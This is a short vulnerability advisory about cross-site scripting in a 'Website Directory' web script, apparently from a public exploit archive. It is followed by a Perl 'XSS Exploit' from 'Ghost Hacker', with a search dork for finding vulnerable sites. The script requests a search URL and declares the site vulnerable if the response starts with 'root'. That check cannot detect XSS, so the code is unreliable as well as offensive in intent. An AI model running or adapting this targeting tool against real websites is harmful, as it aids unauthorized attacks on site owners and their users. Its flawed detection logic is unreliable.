source: http://www.securityfocus.com/bid/31562/info

Website Directory is prone to a cross-site scripting vulnerability because it fails to sufficiently sanitize user-supplied input data.

An attacker may leverage this issue to execute arbitrary script code in the browser of an unsuspecting user in the context of the affected site. This may help the attacker steal cookie-based authentication credentials and launch other attacks.

#!/usr/bin/perl
##################################
# Coded And Found by Ghost Hacker                                     #
# Home www.Real-h.com                                                         #
# Email Ghost-r00t[at]hotmail[dot]com                                #
##################################

use LWP::UserAgent;
use HTTP::Request;
use LWP::Simple;

print "\t\t########################################################\n\n";
print "\t\t# Website Directory - XSS Exploit                      #\n\n";
print "\t\t# by Ghost Hacker [Real-h.com]                         #\n\n";
print "\t\t# Dork : Powered by MaxiScript.com                     #\n\n";
print "\t\t########################################################\n\n";


if (!$ARGV[0])
{
print "  Author   : Ghost Hacker\n";
print "  Home     : www.Real-h.com\n";
print "  Email    : Ghost-r00t[at]Hotmail[dot]com\n";
print "  Download : http://www.maxiscript.com/websitedirectory.php\n";
print "  Usage    : perl Ghost.pl [Host]\n";
print "  Example  : perl Ghost.pl http://Real-h.com/path/\n";
}

else
{

$web=$ARGV[0];
chomp $web;

$iny="index.php?keyword=Xss_Hacking&action=search";

my $web1=$web.$iny;
print "$web1\n\n";
my $ua = LWP::UserAgent->new;
my $req=HTTP::Request->new(GET=>$web1);
$doc = $ua->request($req)->as_string;

if ($doc=~ /^root/moxis ){
print "Web is vuln\n";
}
else
{
print "Web is not vuln\n";
}

}
